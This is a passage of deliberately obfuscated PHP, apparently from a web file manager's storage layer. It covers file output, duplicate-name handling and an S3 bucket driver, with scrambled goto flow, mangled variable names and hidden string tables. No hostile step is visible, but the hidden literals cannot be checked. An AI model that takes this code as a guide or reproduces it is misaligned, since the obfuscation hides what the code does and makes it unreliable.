md5("{$c•Ø‘ÀíÒá[$Eğå…•«ïÃ[28]]}\x5f{$c•Ø‘ÀíÒá[$Eğå…•«ïÃ[76]]}\137{$c•Ø‘ÀíÒá[$Eğå…•«ïÃ[78]]}"); } } goto aëÂ©Ÿ›™; EÌ³×ğ“á: $c•Ø‘ÀíÒá = $this->info($cÈ¼¨ªßôµ); $AÄŠ˜ğâ = $c•Ø‘ÀíÒá[$Eğå…•«ïÃ[28]]; $a”™–¦’Î = !1; goto eêêÉİµª; fßÏ‡†º: del_file($fÉŠ£Ëƒ„); IO::fileOut($c±Ö¦ğ“§Ü); goto DÚŠ»©ù÷ó; aëÂ©Ÿ›™: $fŠ¸°‘Éˆ† = "{$a¿ÎÖ¼“¨º}\137{$A…ÂÒòÆÅ×}\56\160\156\x67"; if (!($eÌ´µñ¸“Â = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $Eğå…•«ïÃ[172]))) { $C³àêâÔ”œ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $Eğå…•«ïÃ[173]); } else { $C³àêâÔ”œ = KodIO::make($eÌ´µñ¸“Â); } if ($eÌ´µñ¸“Â = IO::fileNameExist($C³àêâÔ”œ, $fŠ¸°‘Éˆ†)) { $fÉŠ£Ëƒ„ = KodIO::make($eÌ´µñ¸“Â); return IO::fileOut($fÉŠ£Ëƒ„, !1, $AÄŠ˜ğâ); } goto Fº«İ«Ì®¬; BÁ¦»ÁÓ: $Eğå…•«ïÃ =& $_SERVER[«¾°Ã¤]; set_timeout(); if (substr($cÈ¼¨ªßôµ, 0, 4) == $Eğå…•«ïÃ[147]) { $this->fileOutLink($cÈ¼¨ªßôµ); } goto EÌ³×ğ“á; DÚŠ»©ù÷ó: } public function fileOutImageServer($EÍ˜ŞÌÒ™‹, $EØÍ‰ÙŞ¬ = 250) { $this->fileOutImage($EÍ˜ŞÌÒ™‹, $EØÍ‰ÙŞ¬); } public function fileNameAuto($EîÕ¹Œ†Ù, $BççÃóÍ¿, $a»†ªëØ¨ = REPEAT_RENAME, $bËÖ®¥ß = false) { goto B²ë¬»‘‡Ã; Aáó«ˆÃ: while ($this->exist(rtrim($EîÕ¹Œ†Ù, $fÉ®ïÎ±Ê[8]) . $fÉ®ïÎ±Ê[8] . $b»‚÷ØÊŠÆ)) { $b»‚÷ØÊŠÆ = $aùë²ôèù… . "\50{$eöô–Û·¤ß}\51{$DâÇ“ÉøÆ}"; $eöô–Û·¤ß++; } return $b»‚÷ØÊŠÆ; goto eÎ†“Ëø Œ; dŸÛóÇ‹÷ø: $eöô–Û·¤ß = 1; $aùë²ôèù… = substr($BççÃóÍ¿, 0, strlen($BççÃóÍ¿) - strlen($DâÇ“ÉøÆ)); $b»‚÷ØÊŠÆ = $aùë²ôèù… . "\x28{$eöô–Û·¤ß}\51{$DâÇ“ÉøÆ}"; goto Aáó«ˆÃ; dÕæ²‘ÏŞê: if ($a»†ªëØ¨ == REPEAT_SKIP) { return !1; } $DâÇ“ÉøÆ = $fÉ®ïÎ±Ê[95] . get_path_ext($BççÃóÍ¿); $DâÇ“ÉøÆ = $DâÇ“ÉøÆ == $fÉ®ïÎ±Ê[95] || $bËÖ®¥ß ? $fÉ®ïÎ±Ê[33] : $DâÇ“ÉøÆ; goto dŸÛóÇ‹÷ø; B²ë¬»‘‡Ã: $fÉ®ïÎ±Ê =& $_SERVER[«¾°Ã¤]; $b÷Í–¬¾° = $EîÕ¹Œ†Ù === $fÉ®ïÎ±Ê[33] ? $BççÃóÍ¿ : rtrim($EîÕ¹Œ†Ù, $fÉ®ïÎ±Ê[8]) . $fÉ®ïÎ±Ê[8] . $BççÃóÍ¿; if ($a»†ªëØ¨ == REPEAT_REPLACE || !$this->exist($b÷Í–¬¾°) || $bËÖ®¥ß && $a»†ªëØ¨ != REPEAT_RENAME_FOLDER) { return $BççÃóÍ¿; } goto dÕæ²‘ÏŞê; eÎ†“Ëø Œ: } private function fileNameAutoList($EŒŠâ‡ƒ¦, $CœÄŒªê£¿, $c·ØŸßƒËï = false) { goto fâÖÌø‡™„; D‘Û¾İ±“ƒ: $f–¹«¤ = array_to_keyvalue($a”‚¸ÑÔœÏ, $D„á§ÓÏˆ[33], $D„á§ÓÏˆ[28]); $D«ŠÍÎó = $D„á§ÓÏˆ[95] . get_path_ext($CœÄŒªê£¿); $D«ŠÍÎó = $D«ŠÍÎó == $D„á§ÓÏˆ[95] || $c·ØŸßƒËï ? $D„á§ÓÏˆ[33] : $D«ŠÍÎó; goto bœ¿ŒÈÜ»œ; e…ôò¥£§: return $B®³ÃÎÍØ·; goto E•Æ¢‹ê‡»; fâÖÌø‡™„: $D„á§ÓÏˆ =& $_SERVER[«¾°Ã¤]; $a”‚¸ÑÔœÏ = $this->listPath($EŒŠâ‡ƒ¦, !0); $a”‚¸ÑÔœÏ = array_merge($a”‚¸ÑÔœÏ[$D„á§ÓÏˆ[75]], $a”‚¸ÑÔœÏ[$D„á§ÓÏˆ[74]]); goto D‘Û¾İ±“ƒ; bœ¿ŒÈÜ»œ: $E¡Šº§ğÚˆ = substr($CœÄŒªê£¿, 0, strlen($CœÄŒªê£¿) - strlen($D«ŠÍÎó)); $B®³ÃÎÍØ· = $E¡Šº§ğÚˆ . "\x28\x30\x29{$D«ŠÍÎó}"; for ($AªŸÅ¦Æù¤ = 1; $AªŸÅ¦Æù¤ <= count($f–¹«¤) + 1; $AªŸÅ¦Æù¤++) { $B®³ÃÎÍØ· = $E¡Šº§ğÚˆ . "\x28{$AªŸÅ¦Æù¤}\51{$D«ŠÍÎó}"; if (!in_array_not_case($B®³ÃÎÍØ·, $f–¹«¤)) { return $B®³ÃÎÍØ·; } } goto e…ôò¥£§; E•Æ¢‹ê‡»: } public function listAllFiles($Cƒò²Ëê¸“, $dä¹Ë’åñÉ, $Fó»‰ÀÚ¤‚ = array()) { goto d™³Š°¯å–; Cäß»ä¯ğ°: $Cƒò²Ëê¸“ = trim($Cƒò²Ëê¸“, $FœíË÷˜†[8]); foreach ($dä¹Ë’åñÉ as $FÆåğ½òÀš) { $E–³ÔœÙ¼ä = ltrim(substr(trim($FÆåğ½òÀš, $FœíË÷˜†[8]), strlen($Cƒò²Ëê¸“)), $FœíË÷˜†[8]); $F‚ÔµØäİØ = array_merge($F‚ÔµØäİØ, $this->slicePath($E–³ÔœÙ¼ä)); } $FÙ¯ŠŸÛæ¯ = array(); goto fõ–î›êòÚ; fõ–î›êòÚ: foreach (array_unique($F‚ÔµØäİØ) as $FÆåğ½òÀš) { $D¨ †¤‚§É = array($FœíË÷˜†[76] => $this->getPathOuter($FœíË÷˜†[8] . $Cƒò²Ëê¸“ . $FœíË÷˜†[8] . $FÆåğ½òÀš), $FœíË÷˜†[77] => 1, $FœíË÷˜†[78] => 0); if (substr($FÆåğ½òÀš, -1) != $FœíË÷˜†[8]) { $D¨ †¤‚§É[$FœíË÷˜†[77]] = 0; $C¸Ò¨‰÷İ = $this->getPath($Cƒò²Ëê¸“ . $FœíË÷˜†[8] . $FÆåğ½òÀš); $D¨ †¤‚§É[$FœíË÷˜†[78]] = isset($Fó»‰ÀÚ¤‚[$C¸Ò¨‰÷İ]) ? $Fó»‰ÀÚ¤‚[$C¸Ò¨‰÷İ] : $this->size($C¸Ò¨‰÷İ); } $FÙ¯ŠŸÛæ¯[] = $D¨ †¤‚§É; } return $FÙ¯ŠŸÛæ¯; goto FùĞ±‘ô‚; d™³Š°¯å–: $FœíË÷˜† =& $_SERVER[«¾°Ã¤]; if (empty($dä¹Ë’åñÉ)) { return array(); } $F‚ÔµØäİØ = array(); goto Cäß»ä¯ğ°; FùĞ±‘ô‚: } public function slicePath($EµÄÀù‰Ùì) { $FÁÙóÙÅÈ… =& $_SERVER[«¾°Ã¤]; $E—ÎòÆ•­ = explode($FÁÙóÙÅÈ…[8], trim($EµÄÀù‰Ùì, $FÁÙóÙÅÈ…[8])); $AŸÕ‰‹œ = 0; do { ++$AŸÕ‰‹œ; $A£… ö¸ˆ[] = implode($FÁÙóÙÅÈ…[8], array_slice($E—ÎòÆ•­, 0, $AŸÕ‰‹œ)) . $FÁÙóÙÅÈ…[8]; } while ($AŸÕ‰‹œ < count($E—ÎòÆ•­)); $A£… ö¸ˆ[count($E—ÎòÆ•­) - 1] = $EµÄÀù‰Ùì; return $A£… ö¸ˆ; } public function getHost() { $c† Š±­‚ =& $_SERVER[«¾°Ã¤]; $DòÉ„éÎ‹è = parse_url(trim($this->domain, $c† Š±­‚[8])); $D¦Íš³à™„ = isset($DòÉ„éÎ‹è[$c† Š±­‚[174]]) ? $DòÉ„éÎ‹è[$c† Š±­‚[174]] : http_type(); $f²ª¬Ëâ‡ó = isset($DòÉ„éÎ‹è[$c† Š±­‚[175]]) ? $DòÉ„éÎ‹è[$c† Š±­‚[175]] : $DòÉ„éÎ‹è[$c† Š±­‚[76]]; if (isset($DòÉ„éÎ‹è[$c† Š±­‚[176]])) { $f²ª¬Ëâ‡ó .= $c† Š±­‚[4] . $DòÉ„éÎ‹è[$c† Š±­‚[176]]; } return $D¦Íš³à™„ . $c† Š±­‚[177] . $f²ª¬Ëâ‡ó; } public function pathEncode($DÖƒë‡¶Œ) { $e¹¹¼ËÂ» =& $_SERVER[«¾°Ã¤]; return str_replace($e¹¹¼ËÂ»[178], $e¹¹¼ËÂ»[8], rawurlencode($DÖƒë‡¶Œ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($bÅŒâ¶°·) { set_timeout(); require_once SDK_DIR . $_SERVER[«¾°Ã¤][179]; parent::__construct(); $this->_init($bÅŒâ¶°·); } public function _init($eæ¶ÅÑ‰ºœ) { foreach ($eæ¶ÅÑ‰ºœ as $Cñ¹ğ­’ => $bĞ…èÍ„Ñª) { if (isset($this->{$Cñ¹ğ­’})) { $this->{$Cñ¹ğ­’} = $bĞ…èÍ„Ñª; } } $this->endpoint = $eæ¶ÅÑ‰ºœ[$_SERVER[«¾°Ã¤][180]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($bùõ©à‰è = "\166\x34") { $this->signVer = $bùõ©à‰è; $this->client->setSignatureVersion($bùõ©à‰è); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto fù¸¢ƒñæ; fù¸¢ƒñæ: $föÔßğÊœ· =& $_SERVER[«¾°Ã¤]; $F´Û…¸¤ÃÛ = $this->getBucketCors(); if (!$F´Û…¸¤ÃÛ || !is_array($F´Û…¸¤ÃÛ)) { return !1; } goto c¶ÏùĞ«ÛĞ; c¶ÏùĞ«ÛĞ: if ($F´Û…¸¤ÃÛ[$föÔßğÊœ·[181]] != $föÔßğÊœ·[182] || $F´Û…¸¤ÃÛ[$föÔßğÊœ·[183]] != $föÔßğÊœ·[182]) { return !1; } $FÕ§©“ÃÇî = array_map($föÔßğÊœ·[184], $F´Û…¸¤ÃÛ[$föÔßğÊœ·[185]]); if (!is_array($FÕ§©“ÃÇî)) { $FÕ§©“ÃÇî = array(); } goto Aî¹ˆƒÒã‡; Aî¹ˆƒÒã‡: $AäÀ‡…¸œ = array($föÔßğÊœ·[186], $föÔßğÊœ·[187], $föÔßğÊœ·[188], $föÔßğÊœ·[189], $föÔßğÊœ·[190]); $F‘Ç¶Ó¤¦ = array_diff($AäÀ‡…¸œ, $FÕ§©“ÃÇî); return empty($F‘Ç¶Ó¤¦); goto C½“¦Ş™…¸; C½“¦Ş™…¸: } public function mkfile($bğ˜æ»—ó¡, $DÀ©Ñ‹ù‡‚ = '', $E¶â’¨†»† = REPEAT_RENAME) { $féô›Î Šñ = $this->setContent($bğ˜æ»—ó¡, $DÀ©Ñ‹ù‡‚); if ($féô›Î Šñ !== !1) { return $this->getPathOuter($bğ˜æ»—ó¡); } return !1; } public function mkdir($D±Š‹Ÿ¿­â, $f¾Ú®—®ì = REPEAT_SKIP) { $B¶ªÍ±Ù =& $_SERVER[«¾°Ã¤]; if (empty($D±Š‹Ÿ¿­â) && $D±Š‹Ÿ¿­â !== $B¶ªÍ±Ù[191]) { return !1; } if ($this->_isFolder($D±Š‹Ÿ¿­â)) { return $this->getPathOuter($D±Š‹Ÿ¿­â); } $E‰’íÜ³„Ş = $this->setContent($D±Š‹Ÿ¿­â, $B¶ªÍ±Ù[33], !0); if ($E‰’íÜ³„Ş !== !1) { return $this->getPathOuter($D±Š‹Ÿ¿­â); } return !1; } public function copyFile($cˆƒ½¸ÅŸõ, $CŒ‰ºéƒÉÇ, $Eä„Ò‰¾Ñ© = array()) { $aº‘ÈùÕäß =& $_SERVER[«¾°Ã¤]; $b¨ìöÅ×‹ = $this->objectMeta($cˆƒ½¸ÅŸõ); if (!$b¨ìöÅ×‹) { return !1; } if ($b¨ìöÅ×‹[$aº‘ÈùÕäß[78]] <= 1024 * 1024 * 200) { $B˜’‹È¯‹¹ = $this->client->copyObject($this->bucket, $cˆƒ½¸ÅŸõ, $this->bucket, $CŒ‰ºéƒÉÇ, $aº‘ÈùÕäß[192], $Eä„Ò‰¾Ñ©); } else { $B˜’‹È¯‹¹ = $this->client->multiCopyObject($this->bucket, $cˆƒ½¸ÅŸõ, $this->bucket, $CŒ‰ºéƒÉÇ, $Eä„Ò‰¾Ñ©); } $B˜’‹È¯‹¹ = $B˜’‹È¯‹¹ ? $this->getPathOuter($CŒ‰ºéƒÉÇ) : !1; return $B˜’‹È¯‹¹; } public function moveFile($eÈºéç£‰õ, $Eî§ ®) { if ($this->copyFile($eÈºéç£‰õ, $Eî§ ®)) { $this->delFile($eÈºéç£‰õ); return $this->getPathOuter($Eî§ ®); } return !1; } public function delFile($Aš†¶‚—Ä¡) { return $this->client->deleteObject($this->bucket, $Aš†¶‚—Ä¡); } public function delFolder($Fè²ä¨‹´ß) { goto DàÈÎù´¦•; bÀ¹ªç˜­: if (!empty($Fè²ä¨‹´ß) && $Fè²ä¨‹´ß !== $Cï‡»Èëª[191] && !in_array($eÆâ•éÊ¡Ø, $dÊ¢¦Š×Şô[$Cï‡»Èëª[75]])) { $dÊ¢¦Š×Şô[$Cï‡»Èëª[75]][] = $eÆâ•éÊ¡Ø; } $cÛÊôÛ«‡¶ = $this->delByBatch($dÊ¢¦Š×Şô[$Cï‡»Èëª[74]]); if (!$cÛÊôÛ«‡¶) { return !1; } goto d¤Øğ§ç¶²; DàÈÎù´¦•: $Cï‡»Èëª =& $_SERVER[«¾°Ã¤]; if (!$this->exist($Fè²ä¨‹´ß)) { return !0; } $this->listItemCache = !1; goto dèô›¶İÇ¡; dèô›¶İÇ¡: $dÊ¢¦Š×Şô = $this->fileList($Fè²ä¨‹´ß); $this->listItemCache = !0; $eÆâ•éÊ¡Ø = trim($Fè²ä¨‹´ß, $Cï‡»Èëª[8]) . $Cï‡»Èëª[8]; goto bÀ¹ªç˜­; d¤Øğ§ç¶²: $cÛÊôÛ«‡¶ = $this->delByBatch($dÊ¢¦Š×Şô[$Cï‡»Èëª[75]]); if (!$cÛÊôÛ«‡¶) { return !1; } return $this->delFile($eÆâ•éÊ¡Ø); goto DÒï¶Š­ÓÍ; DÒï¶Š­ÓÍ: } private function delByBatch($fºÍÂŠ¾‹…) { foreach (array_chunk($fºÍÂŠ¾‹…, 1000) as $EËçÉ©ßİ£) { $bÉğº’¡”Ğ = $this->client->deleteObjects($this->bucket, $EËçÉ©ßİ£); if (!$bÉğº’¡”Ğ) { return !1; } } return !0; } public function rename($a˜ç²¨§, $aÚ¸Óòêæ) { return $this->renameObject($a˜ç²¨§, $aÚ¸Óòêæ); } public function listPath($e­«†Ñ‚‚›, $fÔíõØğ›Ì = false) { $a¿”Ú²¨ÁÄ =& $_SERVER[«¾°Ã¤]; $AÛ‡Æº’ˆ = $this->fileList($e­«†Ñ‚‚›, $a¿”Ú²¨ÁÄ[8], !0); foreach ($AÛ‡Æº’ˆ[$a¿”Ú²¨ÁÄ[75]] as $a”Ö±ºÆö => $cê˜Æ¯¤¤) { $AÛ‡Æº’ˆ[$a¿”Ú²¨ÁÄ[75]][$a”Ö±ºÆö] = $this->folderInfo($cê˜Æ¯¤¤, $fÔíõØğ›Ì); } foreach ($AÛ‡Æº’ˆ[$a¿”Ú²¨ÁÄ[74]] as $a”Ö±ºÆö => $cê˜Æ¯¤¤) { $AÛ‡Æº’ˆ[$a¿”Ú²¨ÁÄ[74]][$a”Ö±ºÆö] = $this->fileInfo($cê˜Æ¯¤¤[$a¿”Ú²¨ÁÄ[28]], $fÔíõØğ›Ì, $cê˜Æ¯¤¤); } return $AÛ‡Æº’ˆ; } private function fileInfo($AÏŠÑ¼ÕÊ™, $BÃĞ§œŸ” = false, $cÜ½òÃšÁµ = array()) { goto fô…êæ”¤¸; AÒñ•Éœ÷: $CŒñ¾Èğ[$EÛÅÕÁŒØ[194]] = $CŒñ¾Èğ[$EÛÅÕÁŒØ[84]] = 0; $CŒñ¾Èğ[$EÛÅÕÁŒØ[195]] = $CŒñ¾Èğ[$EÛÅÕÁŒØ[196]] = !0; if (empty($cÜ½òÃšÁµ)) { $cÜ½òÃšÁµ = $this->objectMeta($AÏŠÑ¼ÕÊ™); if (!$cÜ½òÃšÁµ) { return $CŒñ¾Èğ; } } goto d²ôƒšƒŠø; d²ôƒšƒŠø: if (isset($cÜ½òÃšÁµ[$EÛÅÕÁŒØ[197]])) { $CŒñ¾Èğ[$EÛÅÕÁŒØ[84]] = $cÜ½òÃšÁµ[$EÛÅÕÁŒØ[197]]; } if (isset($cÜ½òÃšÁµ[$EÛÅÕÁŒØ[78]])) { $CŒñ¾Èğ[$EÛÅÕÁŒØ[78]] = $cÜ½òÃšÁµ[$EÛÅÕÁŒØ[78]]; } return $CŒñ¾Èğ; goto D­æâö‹´½; fô…êæ”¤¸: $EÛÅÕÁŒØ =& $_SERVER[«¾°Ã¤]; $CŒñ¾Èğ = array($EÛÅÕÁŒØ[28] => $this->pathThis($AÏŠÑ¼ÕÊ™), $EÛÅÕÁŒØ[76] => $this->getPathOuter($AÏŠÑ¼ÕÊ™), $EÛÅÕÁŒØ[29] => $EÛÅÕÁŒØ[193], $EÛÅÕÁŒØ[168] => $this->ext($AÏŠÑ¼ÕÊ™), $EÛÅÕÁŒØ[78] => isset($cÜ½òÃšÁµ[$EÛÅÕÁŒØ[78]]) ? $cÜ½òÃšÁµ[$EÛÅÕÁŒØ[78]] : 0); if ($BÃĞ§œŸ”) { return $CŒñ¾Èğ; } goto AÒñ•Éœ÷; D­æâö‹´½: } private function folderInfo($e¼¹–˜ñ¬Ğ, $b¢óÂÕö¦ = false) { goto f…šÛÍ—÷Ï; aªëô¨ÃÇ: $FóÔİ”­½ó[$A¾Ù¹ÃÚë[194]] = $FóÔİ”­½ó[$A¾Ù¹ÃÚë[84]] = 0; $FóÔİ”­½ó[$A¾Ù¹ÃÚë[195]] = $FóÔİ”­½ó[$A¾Ù¹ÃÚë[196]] = !0; if ($e¼¹–˜ñ¬Ğ == $A¾Ù¹ÃÚë[33]) { return $FóÔİ”­½ó; } goto E‡ÀŸà‹ã; E‡ÀŸà‹ã: $e¼¹–˜ñ¬Ğ = trim($e¼¹–˜ñ¬Ğ, $A¾Ù¹ÃÚë[8]) . $A¾Ù¹ÃÚë[8]; $AŒâßÎ»µò = $this->objectMeta($e¼¹–˜ñ¬Ğ); if (isset($AŒâßÎ»µò[$A¾Ù¹ÃÚë[197]])) { $FóÔİ”­½ó[$A¾Ù¹ÃÚë[194]] = $AŒâßÎ»µò[$A¾Ù¹ÃÚë[197]]; } goto C¡®çšâ›; f…šÛÍ—÷Ï: $A¾Ù¹ÃÚë =& $_SERVER[«¾°Ã¤]; $FóÔİ”­½ó = array($A¾Ù¹ÃÚë[28] => $this->pathThis($e¼¹–˜ñ¬Ğ), $A¾Ù¹ÃÚë[76] => $this->getPathOuter($A¾Ù¹ÃÚë[8] . $e¼¹–˜ñ¬Ğ), $A¾Ù¹ÃÚë[29] => $A¾Ù¹ÃÚë[77]); if ($b¢óÂÕö¦) { return $FóÔİ”­½ó; } goto aªëô¨ÃÇ; C¡®çšâ›: return $FóÔİ”­½ó; goto aÊÍ‘Åµ¨; aÊÍ‘Åµ¨: } private function fileList($AÆ¢¹§—ÙÓ, $B‰­ñÑ† = '', $BÍƒğ³ã°ê = 0) { goto e‘è»¹åø; e‘è»¹åø: $E”Ğã³Õ×® =& $_SERVER[«¾°Ã¤]; $a£ˆ«†Õ± = rtrim($AÆ¢¹§—ÙÓ, $E”Ğã³Õ×®[8]) . $E”Ğã³Õ×®[8]; $Fíöˆ­óáß = $this->listObjs($a£ˆ«†Õ±, null, null, $B‰­ñÑ†); goto e®âÌŞËŒ†; e®âÌŞËŒ†: if (!$Fíöˆ­óáß) { return array($E”Ğã³Õ×®[75] => array(), $E”Ğã³Õ×®[74] => array()); } $Eä”§„Ó¦À = $this->listItemCache === !1 ? !1 : !0; $BœÀä¹Íˆ = $DöË²õ¦İ¯ = array(); goto DŒ‚éŞ—õÉ; DŒ‚éŞ—õÉ: foreach ($Fíöˆ­óáß[$E”Ğã³Õ×®[198]] as $fìè…æÕËß) { goto AŸà½³ÁÍ×; B™´¥Ï¬‘–: $DöË²õ¦İ¯[] = $BÍƒğ³ã°ê ? $fìè…æÕËß : $B…‘¿Œ˜ÓØ; goto cÛğòÎ„°Ÿ; AŸà½³ÁÍ×: $B…‘¿Œ˜ÓØ = $fìè…æÕËß[$E”Ğã³Õ×®[28]]; if ($B…‘¿Œ˜ÓØ == $a£ˆ«†Õ±) { continue; } $e†¶œô…ƒÚ = isset($fìè…æÕËß[$E”Ğã³Õ×®[78]]) ? $fìè…æÕËß[$E”Ğã³Õ×®[78]] : 0; goto cğÀíï¥î”; cğÀíï¥î”: $A«ø·¸ë¶ = $e†¶œô…ƒÚ == 0 && substr($B…‘¿Œ˜ÓØ, strlen($B…‘¿Œ˜ÓØ) - 1, 1) == $E”Ğã³Õ×®[8] ? !0 : !1; if ($Eä”§„Ó¦À) { $this->cacheMethod($E”Ğã³Õ×®[199], $B…‘¿Œ˜ÓØ, $A«ø·¸ë¶); $this->cacheMethod($E”Ğã³Õ×®[200], $B…‘¿Œ˜ÓØ, $fìè…æÕËß); } if ($A«ø·¸ë¶) { $BœÀä¹Íˆ[] = $B…‘¿Œ˜ÓØ; continue; } goto B™´¥Ï¬‘–; cÛğòÎ„°Ÿ: } foreach ($Fíöˆ­óáß[$E”Ğã³Õ×®[201]] as $fìè…æÕËß) { $BœÀä¹Íˆ[] = $fìè…æÕËß[$E”Ğã³Õ×®[28]]; if ($Eä”§„Ó¦À) { $this->cacheMethod($E”Ğã³Õ×®[199], $fìè…æÕËß[$E”Ğã³Õ×®[28]], !0); } } if ($Eä”§„Ó¦À) { $this->cacheMethod($E”Ğã³Õ×®[199], $AÆ¢¹§—ÙÓ, !0); } goto CŞøŠ—…ŒÈ; CŞøŠ—…ŒÈ: return array($E”Ğã³Õ×®[75] => $BœÀä¹Íˆ, $E”Ğã³Õ×®[74] => $DöË²õ¦İ¯); goto CŸÓ¡Œ¿‹; CŸÓ¡Œ¿‹: } private function listObjs($e¢Î”çœ©, $FÍ‡É°³¼— = null, $D‰ˆàœƒÈ© = null, $Aáä¶°é‰Â = null) { $A–ºø»˜ =& $_SERVER[«¾°Ã¤]; $e¢Î”çœ© = trim($e¢Î”çœ©, $A–ºø»˜[8]); $D†Éù×á®§ = empty($e¢Î”çœ©) && $e¢Î”çœ© !== $A–ºø»˜[191] ? $A–ºø»˜[33] : $e¢Î”çœ© . $A–ºø»˜[8]; return $this->client->getBucket($this->bucket, $D†Éù×á®§, $FÍ‡É°³¼—, $D‰ˆàœƒÈ©, $Aáä¶°é‰Â, !0); } public function has($F¤Óôôôƒ, $Dœ´°Ôä¬Ó = false, $e‡ŠÓØñ = true) { goto D˜²Òù‰ö; cÄìøÀ¥µ¬: $FØ‹¶Ş¢ä = $A‹¯„ØòÁ = array(); while (!0) { $C•Ùªï‹æ = $this->listObjs($F¤Óôôôƒ, $cÂá„ñÙ¨, $dêŒŞ‹¿¯Ç, $EãŸ‡‰æ•õ); if (!$C•Ùªï‹æ) { break; } $cÂá„ñÙ¨ = $C•Ùªï‹æ[$f‰¢²›Ó¾µ[202]]; $E×ãèó¥œ = $C•Ùªï‹æ[$f‰¢²›Ó¾µ[198]]; $FÂ¿‹°˜¬° = $C•Ùªï‹æ[$f‰¢²›Ó¾µ[201]]; if (empty($E×ãèó¥œ) && empty($FÂ¿‹°˜¬°)) { break; } if (count($E×ãèó¥œ) == 1 && $E×ãèó¥œ[0][$f‰¢²›Ó¾µ[28]] == $C·ÊƒäØô¸) { break; } if ($Dœ´°Ôä¬Ó) { if (count($E×ãèó¥œ)) { $E×ãèó¥œ = array_column($E×ãèó¥œ, $f‰¢²›Ó¾µ[28]); $FØ‹¶Ş¢ä = array_merge($FØ‹¶Ş¢ä, $E×ãèó¥œ); } if (count($FÂ¿‹°˜¬°)) { $FÂ¿‹°˜¬° = array_column($FÂ¿‹°˜¬°, $f‰¢²›Ó¾µ[28]); $A‹¯„ØòÁ = array_merge($A‹¯„ØòÁ, $FÂ¿‹°˜¬°); } if ($cÂá„ñÙ¨ === null) { break; } continue; } if ($e‡ŠÓØñ) { if (!empty($E×ãèó¥œ)) { if (count($E×ãèó¥œ) > 1 || isset($E×ãèó¥œ[0][$f‰¢²›Ó¾µ[28]]) && $E×ãèó¥œ[0][$f‰¢²›Ó¾µ[28]] != $C·ÊƒäØô¸) { return !0; } } } else { if (!empty($FÂ¿‹°˜¬°)) { return !0; } } if ($cÂá„ñÙ¨ === null) { break; } } if ($Dœ´°Ôä¬Ó) { $FØ‹¶Ş¢ä = array_diff($FØ‹¶Ş¢ä, array($C·ÊƒäØô¸)); $FØ‹¶Ş¢ä = count(array_unique($FØ‹¶Ş¢ä)); $A‹¯„ØòÁ = count(array_unique($A‹¯„ØòÁ)); return array($f‰¢²›Ó¾µ[203] => $FØ‹¶Ş¢ä, $f‰¢²›Ó¾µ[204] => $A‹¯„ØòÁ); } goto A‹ì¸ÂêÙ‰; fÎ°¶»¸İÃ: $cÂá„ñÙ¨ = null; $dêŒŞ‹¿¯Ç = 500; $EãŸ‡‰æ•õ = $f‰¢²›Ó¾µ[8]; goto cÄìøÀ¥µ¬; D˜²Òù‰ö: $f‰¢²›Ó¾µ =& $_SERVER[«¾°Ã¤]; $F¤Óôôôƒ = trim($F¤Óôôôƒ, $f‰¢²›Ó¾µ[8]); $C·ÊƒäØô¸ = empty($F¤Óôôôƒ) && $F¤Óôôôƒ !== $f‰¢²›Ó¾µ[191] ? $f‰¢²›Ó¾µ[33] : $F¤Óôôôƒ . $f‰¢²›Ó¾µ[8]; goto fÎ°¶»¸İÃ; A‹ì¸ÂêÙ‰: return !1; goto b¬¯àŒ„‰ë; b¬¯àŒ„‰ë: } public function listAll($Eèöšñ±óƒ) { $D””Ç“©Ä =& $_SERVER[«¾°Ã¤]; $F‘µÉâä = $this->fileList($Eèöšñ±óƒ, $D””Ç“©Ä[33], !0); $bƒÒëŞòæ = array(); foreach ($F‘µÉâä[$D””Ç“©Ä[74]] as $DÜ´ÚŸˆõ÷) { $bƒÒëŞòæ[$DÜ´ÚŸˆõ÷[$D””Ç“©Ä[28]]] = $DÜ´ÚŸˆõ÷[$D””Ç“©Ä[78]]; } foreach ($F‘µÉâä[$D””Ç“©Ä[75]] as $DÜ´ÚŸˆõ÷) { if (is_string($DÜ´ÚŸˆõ÷)) { $bƒÒëŞòæ[$DÜ´ÚŸˆõ÷] = 0; } } return $this->listAllFiles($Eèöšñ±óƒ, array_keys($bƒÒëŞòæ), $bƒÒëŞòæ); } public function canRead($D´–“ãèÛÂ) { $B½ê¢Øƒµ =& $_SERVER[«¾°Ã¤]; $AßÙãñ¶ÆÑ = $this->client->getAccessControlPolicy($this->bucket, $D´–“ãèÛÂ); if (!$AßÙãñ¶ÆÑ) { return !1; } return in_array($AßÙãñ¶ÆÑ, array($B½ê¢Øƒµ[205], $B½ê¢Øƒµ[206], $B½ê¢Øƒµ[207])) ? !0 : !1; } public function canWrite($BÀçÖŒù) { $EÚ»Œä±åç =& $_SERVER[«¾°Ã¤]; $eØÌÔÜ“¤ª = $this->client->getAccessControlPolicy($this->bucket, $BÀçÖŒù); if (!$eØÌÔÜ“¤ª) { return !1; } return in_array($eØÌÔÜ“¤ª, array($EÚ»Œä±åç[205], $EÚ»Œä±åç[206])) ? !0 : !1; } public function getContent($DÈ‹×«êÈµ) { return $this->client->getObject($this->bucket, $DÈ‹×«êÈµ); } public function setContent($BĞ¥Âîïèã, $Cù¦›ŠÀÈä = '', $fÍÚÙ ¶ê = false) { goto Dê´ñ·Ôæ; Dê´ñ·Ôæ: $DîôšÇº’ =& $_SERVER[«¾°Ã¤]; $BĞ¥Âîïèã = $fÍÚÙ ¶ê ? trim($BĞ¥Âîïèã, $DîôšÇº’[8]) . $DîôšÇº’[8] : $BĞ¥Âîïèã; $DÈ³Ö¹êÜ = get_file_mime(get_path_ext($BĞ¥Âîïèã)); goto D¾…á¯†‰; e‡´¹Ù‚: $this->cacheMethod(null, null); $f›ÓâÏ¾ã = $this->copyFile($BĞ¥Âîïèã, $BĞ¥Âîïèã, array($DîôšÇº’[208] => $f›ÓâÏ¾ã[$DîôšÇº’[209]])); return $f›ÓâÏ¾ã ? !0 : !1; goto f——İÁÖĞÆ; D¾…á¯†‰: $f›ÓâÏ¾ã = 